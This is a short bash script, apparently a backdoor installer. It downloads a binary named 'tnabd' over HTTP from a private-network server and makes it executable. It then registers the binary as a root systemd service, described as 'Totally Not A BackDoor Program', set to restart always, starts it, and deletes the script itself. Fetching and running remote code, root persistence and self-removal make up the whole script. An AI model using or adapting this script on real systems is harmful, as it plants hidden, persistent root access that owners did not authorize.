#!/bin/bash

server=192.168.2.199:8000
binary=tnabd

pwd=$(pwd)

serv_pid=$(pgrep -u root $binary)
if [ ! -z $serv_pid ]
then
    kill -9 $serv_pid
fi

if [ -f $binary ]
then
    rm $binary
fi

wget http://$server/$binary

chmod u+x $binary

file="/etc/systemd/system/$binary.service"

echo -e "[Unit]\nDescription=Totally Not A BackDoor Program\n[Install]\nWantedBy=multi-user.target\n[Service]\nExecStart=$pwd/$binary\nType=simple\nUser=root\nGroup=root\nWorkingDirectory=$pwd\nRestart=always\nRestartSec=10" > $file 

systemctl daemon-reload

systemctl enable $binary

service $binary start

rm run.sh



